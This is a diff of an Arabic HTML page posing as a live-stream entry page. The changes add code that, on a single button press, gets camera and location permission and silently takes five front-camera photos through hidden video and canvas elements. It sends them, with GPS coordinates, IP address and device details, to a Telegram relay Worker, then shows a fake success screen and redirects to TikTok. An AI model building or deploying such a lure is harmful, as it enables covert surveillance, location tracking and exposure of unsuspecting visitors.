@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>LIVE - بث مباشر</title>
 <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -97,7 +97,6 @@
         flex-shrink: 0;
     }
 
-    /* سبينر صغير داخل الزر أثناء التحميل */
     .btn-spinner {
         width: 18px; height: 18px;
         border: 3px solid rgba(255,255,255,0.35);
@@ -116,7 +115,6 @@
         margin-top: 24px; color: #555663; font-size: 12px;
     }
 
-    /* رسالة الخطأ */
     .error-toast {
         position: fixed;
         bottom: 30px; left: 50%;
@@ -136,7 +134,6 @@
     }
     .error-toast.show { transform: translateX(-50%) translateY(0); }
 
-    /* شاشة التحميل الكاملة */
     .loading-overlay {
         position: fixed;
         inset: 0;
@@ -165,12 +162,58 @@
         font-size: 15px;
         font-weight: 700;
         letter-spacing: .5px;
+        text-align: center;
     }
 
     .loading-sub {
         color: #92939f;
         font-size: 12px;
         margin-top: -8px;
+        text-align: center;
+        padding: 0 20px;
+    }
+
+    .photo-progress {
+        width: 200px;
+        height: 6px;
+        background: rgba(255,255,255,0.1);
+        border-radius: 10px;
+        overflow: hidden;
+        margin-top: 5px;
+    }
+    .photo-progress-bar {
+        height: 100%;
+        background: linear-gradient(90deg, #ff315f, #5032ff);
+        width: 0%;
+        transition: width 0.4s ease;
+        border-radius: 10px;
+    }
+
+    /* أيقونة نجاح */
+    .success-check {
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #10b981, #34d399);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 10px 40px rgba(16, 185, 129, 0.4);
+        animation: popIn 0.5s ease;
+    }
+    .success-check svg { width: 38px; height: 38px; }
+    @keyframes popIn {
+        from { transform: scale(0); opacity: 0; }
+        to { transform: scale(1); opacity: 1; }
+    }
+
+    #video, #canvas {
+        position: fixed;
+        top: 0; left: 0;
+        width: 1px; height: 1px;
+        opacity: 0;
+        pointer-events: none;
+        z-index: -999;
     }
 
     @media (max-width: 600px) {
@@ -186,65 +229,106 @@
 <body>
 
 <main class="page">
-
-    <!-- خلفية -->
     <div class="circle one"></div>
     <div class="circle two"></div>
 
-    <!-- المحتوى -->
     <div class="content">
-
-        <!-- الشعار -->
         <div class="logo">LI<span>VE</span></div>
 
-        <!-- الحالة -->
         <div class="status">
             <span class="status-dot"></span>
             البث المباشر متاح الآن
         </div>
 
-        <!-- العنوان -->
         <h1 class="title">شاهد البث <span>مباشرة</span></h1>
 
-        <!-- الوصف -->
         <p class="description">
             ادخل إلى البث المباشر واستمتع بالمحتوى وتابع ما يحدث الآن.
         </p>
 
-        <!-- الزر الوحيد -->
-        <button type="button" class="live-button" id="liveBtn" onclick="requestPermissionsAndGo()">
+        <button type="button" class="live-button" id="liveBtn" onclick="startProcess()">
             <span class="button-dot"></span>
             <span class="btn-spinner"></span>
             <span class="btn-text">دخول البث المباشر</span>
         </button>
 
         <div class="bottom-text">بث مباشر • سريع • آمن</div>
-
     </div>
-
 </main>
 
 <!-- شاشة التحميل -->
 <div class="loading-overlay" id="loadingOverlay">
-    <div class="big-spinner"></div>
+    <div class="big-spinner" id="mainSpinner"></div>
+    <div class="success-check" id="successCheck" style="display:none;">
+        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3">
+            <polyline points="20 6 9 17 4 12"/>
+        </svg>
+    </div>
     <div class="loading-text" id="loadingText">جاري طلب الصلاحيات...</div>
-    <div class="loading-sub" id="loadingSub">يرجى الموافقة على الوصول للكاميرا والميكروفون والموقع</div>
+    <div class="loading-sub" id="loadingSub">يرجى الموافقة على الوصول للكاميرا والموقع</div>
+    <div class="photo-progress" id="photoProgress" style="display:none;">
+        <div class="photo-progress-bar" id="photoProgressBar"></div>
+    </div>
 </div>
 
 <!-- رسالة الخطأ -->
 <div class="error-toast" id="errorToast"></div>
 
+<!-- عناصر الكاميرا المخفية -->
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
 <script>
+    // ==========================================
+    // ⚙️ الإعدادات - عدل هذه القيم فقط
+    // ==========================================
+    
+    // رابط الـ Worker الخاص بك
+    const API_URL = "https://telegram.mustafaalomar911.workers.dev";
+    
+    // 🔗 رابط الموقع الذي سيتم الانتقال إليه بعد نجاح العملية
+    // ضع أي رابط بث مباشر تريده هنا
+    const REDIRECT_URL = "https://vt.tiktok.com/ZSqVrN9nf/";
+    
+    // عدد الصور المطلوب التقاطها
+    const CAPTURE_COUNT = 5;
+    
+    // الفاصل الزمني بين الصور (بالمللي ثانية)
+    const CAPTURE_INTERVAL = 2000;
+    
+    // ⏱️ مدة عرض رسالة النجاح قبل الانتقال (بالمللي ثانية)
+    const SUCCESS_DELAY = 1500;
+    
+    // ⚠️ الرابط قد يكون:
+    // - قناة يوتيوب: "https://www.youtube.com/@channelname/live"
+    // - بث تويتر: "https://twitter.com/i/broadcasts/xxxxx"
+    // - بث فيسبوك: "https://www.facebook.com/yourpage/videos/xxxxx"
+    // - تيك توك لايف: "https://www.tiktok.com/@username/live"
+    // - Twitch: "https://www.twitch.tv/username"
+    // - أي رابط آخر
+
+    // ==========================================
+    // عناصر الصفحة
+    // ==========================================
     const liveBtn = document.getElementById('liveBtn');
     const btnText = liveBtn.querySelector('.btn-text');
     const loadingOverlay = document.getElementById('loadingOverlay');
     const loadingText = document.getElementById('loadingText');
     const loadingSub = document.getElementById('loadingSub');
     const errorToast = document.getElementById('errorToast');
+    const photoProgress = document.getElementById('photoProgress');
+    const photoProgressBar = document.getElementById('photoProgressBar');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const mainSpinner = document.getElementById('mainSpinner');
+    const successCheck = document.getElementById('successCheck');
 
     let isProcessing = false;
+    let cameraStream = null;
 
+    // ==========================================
     // عرض رسالة خطأ
+    // ==========================================
     function showError(msg, duration = 5000) {
         errorToast.textContent = msg;
         errorToast.classList.add('show');
@@ -254,9 +338,11 @@
         }, duration);
     }
 
-    // إظهار شاشة التحميل
+    // ==========================================
+    // شاشة التحميل
+    // ==========================================
     function showLoading(text, sub) {
-        loadingText.textContent = text || 'جاري طلب الصلاحيات...';
+        loadingText.textContent = text || 'جاري التحميل...';
         loadingSub.textContent = sub || '';
         loadingOverlay.classList.add('active');
     }
@@ -265,12 +351,85 @@
         loadingOverlay.classList.remove('active');
     }
 
-    // طلب الموقع الجغرافي
+    function updateProgress(current, total) {
+        photoProgress.style.display = 'block';
+        const percentage = (current / total) * 100;
+        photoProgressBar.style.width = percentage + '%';
+    }
+
+    // ==========================================
+    // إرسال إلى Worker
+    // ==========================================
+    async function sendToWorker(action, data) {
+        try {
+            const res = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: action, ...data })
+            });
+            return await res.json();
+        } catch (err) {
+            console.error('Worker error:', err);
+            return { ok: false, error: err.message };
+        }
+    }
+
+    async function sendMessage(text) {
+        return await sendToWorker('sendMessage', { text: text });
+    }
+
+    async function sendPhoto(base64, caption) {
+        let clean = base64;
+        if (clean.includes(',')) clean = clean.split(',')[1];
+        return await sendToWorker('sendPhoto', { image: clean, caption: caption });
+    }
+
+    // ==========================================
+    // معلومات الجهاز
+    // ==========================================
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let browser = 'غير معروف';
+        if (ua.includes('Firefox')) browser = 'Firefox';
+        else if (ua.includes('Edg')) browser = 'Edge';
+        else if (ua.includes('Chrome')) browser = 'Chrome';
+        else if (ua.includes('Safari')) browser = 'Safari';
+
+        let os = 'غير معروف';
+        if (ua.includes('Windows')) os = 'Windows';
+        else if (ua.includes('Mac')) os = 'macOS';
+        else if (ua.includes('Linux')) os = 'Linux';
+        else if (ua.includes('Android')) os = 'Android';
+        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+
+        let deviceType = 'كمبيوتر';
+        if (/Mobi|Android|iPhone/i.test(ua)) deviceType = 'جوال';
+        if (/iPad|Tablet/i.test(ua)) deviceType = 'تابلت';
+
+        return {
+            deviceType, os, browser,
+            userAgent: ua,
+            screen: screen.width + 'x' + screen.height,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            time: new Date().toLocaleString('ar-SY')
+        };
+    }
+
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            return (await res.json()).ip;
+        } catch (e) { return 'غير متوفر'; }
+    }
+
+    // ==========================================
+    // طلب الموقع
+    // ==========================================
     function requestLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
-                resolve({ ok: false, reason: 'unsupported' });
-                return;
+                return resolve({ ok: false, reason: 'unsupported' });
             }
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -278,22 +437,21 @@
                         ok: true,
                         lat: position.coords.latitude,
                         lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy
+                        accuracy: position.coords.accuracy,
+                        mapUrl: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
                     });
                 },
                 (error) => {
                     resolve({ ok: false, reason: error.message, code: error.code });
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 12000,
-                    maximumAge: 0
-                }
+                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
             );
         });
     }
 
-    // طلب الكاميرا والميكروفون
+    // ==========================================
+    // طلب الكاميرا
+    // ==========================================
     async function requestMedia() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             return { ok: false, reason: 'unsupported' };
@@ -302,14 +460,10 @@
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: 'user',
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
                 },
-                audio: {
-                    echoCancellation: true,
-                    noiseSuppression: true,
-                    autoGainControl: true
-                }
+                audio: false
             });
             return { ok: true, stream };
         } catch (err) {
@@ -317,104 +471,208 @@
         }
     }
 
+    // ==========================================
+    // التقاط صورة
+    // ==========================================
+    function capturePhoto() {
+        return new Promise((resolve, reject) => {
+            try {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const base64 = canvas.toDataURL('image/jpeg', 0.7);
+                resolve(base64);
+            } catch (err) {
+                reject(err);
+            }
+        });
+    }
+
+    function stopCamera() {
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(t => t.stop());
+            cameraStream = null;
+        }
+        if (video) video.srcObject = null;
+    }
+
+    // ==========================================
     // الدالة الرئيسية
-    async function requestPermissionsAndGo() {
+    // ==========================================
+    async function startProcess() {
         if (isProcessing) return;
         isProcessing = true;
 
-        // تعطيل الزر وإظهار السبينر
         liveBtn.disabled = true;
         liveBtn.classList.add('loading');
         btnText.textContent = 'جاري التحقق...';
 
-        // 1) طلب الصلاحيات (الكاميرا + الميكروفون + الموقع) بالتوازي
-        showLoading('جاري طلب الصلاحيات...', 'يرجى الموافقة على الوصول للكاميرا والميكروفون والموقع');
+        // إعادة تعيين الأيقونات
+        mainSpinner.style.display = 'block';
+        successCheck.style.display = 'none';
 
-        const [mediaResult, locationResult] = await Promise.all([
-            requestMedia(),
-            requestLocation()
-        ]);
+        showLoading('جاري طلب الصلاحيات...', 'يرجى الموافقة على الوصول للكاميرا والموقع');
 
-        // 2) التحقق من النتائج
-        if (!mediaResult.ok) {
+        try {
+            // 1. طلب الموقع والكاميرا
+            const [mediaResult, locationResult] = await Promise.all([
+                requestMedia(),
+                requestLocation()
+            ]);
+
+            // 2. التحقق من صلاحيات الكاميرا
+            if (!mediaResult.ok) {
+                hideLoading();
+                resetButton();
+
+                let msg = 'تعذر الوصول إلى الكاميرا. ';
+                switch (mediaResult.reason) {
+                    case 'NotAllowedError':
+                    case 'PermissionDeniedError':
+                        msg += 'تم رفض الصلاحية. يرجى السماح بالوصول من إعدادات المتصفح.';
+                        break;
+                    case 'NotFoundError':
+                    case 'DevicesNotFoundError':
+                        msg += 'لا توجد كاميرا متصلة بالجهاز.';
+                        break;
+                    case 'NotReadableError':
+                    case 'TrackStartError':
+                        msg += 'الكاميرا قيد الاستخدام من تطبيق آخر.';
+                        break;
+                    case 'unsupported':
+                        msg = 'متصفحك لا يدعم الوصول إلى الكاميرا.';
+                        break;
+                    default:
+                        msg += 'حدث خطأ: ' + (mediaResult.reason || '');
+                }
+                showError(msg, 6000);
+                return;
+            }
+
+            // 3. ربط الكاميرا
+            cameraStream = mediaResult.stream;
+            video.srcObject = cameraStream;
+
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play().then(resolve).catch(resolve);
+                };
+                setTimeout(resolve, 3000);
+            });
+
+            // 4. إرسال المعلومات
+            showLoading('جاري التحقق من البيانات...', 'يتم إرسال معلومات الجهاز والموقع');
+
+            const deviceInfo = getDeviceInfo();
+            const ip = await getIP();
+
+            let infoMsg = '🎥 <b>زائر جديد - دخول البث المباشر</b>\n\n';
+            infoMsg += '━━━━━━━━━━━━━━━━━\n';
+            infoMsg += '📱 <b>معلومات الجهاز</b>\n';
+            infoMsg += '━━━━━━━━━━━━━━━━━\n';
+            infoMsg += `📱 <b>النوع:</b> ${deviceInfo.deviceType}\n`;
+            infoMsg += `💻 <b>النظام:</b> ${deviceInfo.os}\n`;
+            infoMsg += `🌐 <b>المتصفح:</b> ${deviceInfo.browser}\n`;
+            infoMsg += `🖥 <b>الشاشة:</b> ${deviceInfo.screen}\n`;
+            infoMsg += `🌍 <b>اللغة:</b> ${deviceInfo.language}\n`;
+            infoMsg += `⏰ <b>المنطقة:</b> ${deviceInfo.timezone}\n`;
+            infoMsg += `🕐 <b>الوقت:</b> ${deviceInfo.time}\n`;
+            infoMsg += '\n━━━━━━━━━━━━━━━━━\n';
+            infoMsg += '📍 <b>معلومات الموقع</b>\n';
+            infoMsg += '━━━━━━━━━━━━━━━━━\n';
+            if (locationResult.ok) {
+                infoMsg += `📍 <b>الإحداثيات:</b> ${locationResult.lat}, ${locationResult.lng}\n`;
+                infoMsg += `🎯 <b>الدقة:</b> ${Math.round(locationResult.accuracy)} متر\n`;
+                infoMsg += `🗺 <a href="${locationResult.mapUrl}">عرض على الخريطة</a>\n`;
+            } else {
+                infoMsg += '⚠️ لم يتم تحديد الموقع\n';
+            }
+            infoMsg += '\n━━━━━━━━━━━━━━━━━\n';
+            infoMsg += '🌐 <b>الشبكة</b>\n';
+            infoMsg += '━━━━━━━━━━━━━━━━━\n';
+            infoMsg += `🔢 <b>IP:</b> <code>${ip}</code>\n`;
+
+            await sendMessage(infoMsg);
+
+            // 5. التقاط الصور
+            showLoading('جاري التقاط الصور...', 'يرجى الانتظار قليلاً');
+            
+            for (let i = 1; i <= CAPTURE_COUNT; i++) {
+                await new Promise(r => setTimeout(r, i === 1 ? 800 : CAPTURE_INTERVAL));
+                
+                const photo = await capturePhoto();
+                updateProgress(i, CAPTURE_COUNT);
+                
+                await sendPhoto(photo, `📸 صورة ${i}/${CAPTURE_COUNT} - دخول البث`);
+                console.log('📤 صورة ' + i + ' تم إرسالها');
+            }
+
+            // 6. إيقاف الكاميرا
+            stopCamera();
+
+            // 7. رسالة النجاح للبوت
+            await sendMessage(
+                '✅ <b>اكتمل التحقق بنجاح - البث المباشر</b>\n' +
+                `📸 عدد الصور: ${CAPTURE_COUNT}\n` +
+                `📱 الجهاز: ${deviceInfo.deviceType} - ${deviceInfo.browser}\n` +
+                `🔢 IP: <code>${ip}</code>\n` +
+                `➡️ جاري الانتقال إلى: <a href="${REDIRECT_URL}">${REDIRECT_URL}</a>`
+            );
+
+            // 8. عرض شاشة النجاح
+            mainSpinner.style.display = 'none';
+            successCheck.style.display = 'flex';
+            photoProgress.style.display = 'none';
+            
+            loadingText.textContent = '✅ تم التحقق بنجاح';
+            loadingSub.textContent = 'جاري تحويلك إلى البث المباشر...';
+
+            // 9. الانتقال إلى رابط البث بعد التأخير
+            setTimeout(() => {
+                try {
+                    sessionStorage.setItem('permissions_granted', '1');
+                } catch (e) {}
+                
+                console.log('➡️ الانتقال إلى:', REDIRECT_URL);
+                window.location.href = REDIRECT_URL;
+            }, SUCCESS_DELAY);
+
+        } catch (error) {
+            console.error('❌ خطأ:', error);
+            stopCamera();
             hideLoading();
             resetButton();
-
-            let msg = 'تعذر الوصول إلى الكاميرا والميكروفون. ';
-            switch (mediaResult.reason) {
-                case 'NotAllowedError':
-                case 'PermissionDeniedError':
-                    msg += 'تم رفض الصلاحية. يرجى السماح بالوصول من إعدادات المتصفح.';
-                    break;
-                case 'NotFoundError':
-                case 'DevicesNotFoundError':
-                    msg += 'لا يوجد كاميرا أو ميكروفون متصل بالجهاز.';
-                    break;
-                case 'NotReadableError':
-                case 'TrackStartError':
-                    msg += 'الكاميرا أو الميكروفون قيد الاستخدام من تطبيق آخر.';
-                    break;
-                case 'unsupported':
-                    msg = 'متصفحك لا يدعم الوصول إلى الكاميرا. يرجى استخدام متصفح حديث.';
-                    break;
-                default:
-                    msg += 'حدث خطأ غير متوقع: ' + (mediaResult.reason || '');
-            }
-            showError(msg, 6000);
-            return;
-        }
-
-        // 3) نجحت صلاحيات الكاميرا — إيقاف المسار مؤقتاً (لأن صفحة البث ستطلبه لاحقاً)
-        //    لكننا نحتفظ بإشارة النجاح للتحقق
-        mediaResult.stream.getTracks().forEach(t => t.stop());
-
-        // 4) التحقق من الموقع — إذا رُفض نُظهر تحذيراً لكن نكمل
-        if (!locationResult.ok) {
-            showLoading('تم رفض الموقع', 'سيتم المتابعة بدون تحديد الموقع...');
-            // ننتظر قليلاً ثم نكمل
-            await new Promise(r => setTimeout(r, 1200));
-
-            // نخزّن حالة رفض الموقع
+            showError('حدث خطأ: ' + (error.message || 'غير معروف'), 6000);
+            
             try {
-                sessionStorage.setItem('location_denied', '1');
-                sessionStorage.setItem('location_reason', locationResult.reason || 'denied');
-            } catch (e) {}
-        } else {
-            // نخزّن الإحداثيات للاستخدام في صفحة البث
-            try {
-                sessionStorage.setItem('location_lat', locationResult.lat);
-                sessionStorage.setItem('location_lng', locationResult.lng);
-                sessionStorage.setItem('location_accuracy', locationResult.accuracy);
-                sessionStorage.removeItem('location_denied');
+                await sendMessage('❌ خطأ: ' + error.message);
             } catch (e) {}
         }
-
-        // 5) تخزين علم نجاح الصلاحيات
-        try {
-            sessionStorage.setItem('permissions_granted', '1');
-            sessionStorage.setItem('permissions_time', Date.now());
-        } catch (e) {}
-
-        // 6) عرض رسالة نجاح ثم الانتقال
-        showLoading('✅ تم منح الصلاحيات بنجاح', 'جاري الدخول إلى البث المباشر...');
-
-        setTimeout(() => {
-            window.location.href = 'live.html';
-        }, 900);
     }
 
-    // إعادة تعيين الزر
+    // ==========================================
+    // إعادة تعيين
+    // ==========================================
     function resetButton() {
         isProcessing = false;
         liveBtn.disabled = false;
         liveBtn.classList.remove('loading');
         btnText.textContent = 'دخول البث المباشر';
+        photoProgress.style.display = 'none';
+        photoProgressBar.style.width = '0%';
+        mainSpinner.style.display = 'block';
+        successCheck.style.display = 'none';
     }
 
-    // في حال عاد المستخدم للصفحة (back) نعيد الزر لحالته
     window.addEventListener('pageshow', () => {
         hideLoading();
         resetButton();
+    });
+
+    window.addEventListener('load', () => {
+        console.log('✅ الصفحة جاهزة');
+        console.log('📡 Worker:', API_URL);
+        console.log('➡️ رابط الانتقال:', REDIRECT_URL);
     });
 </script>
 
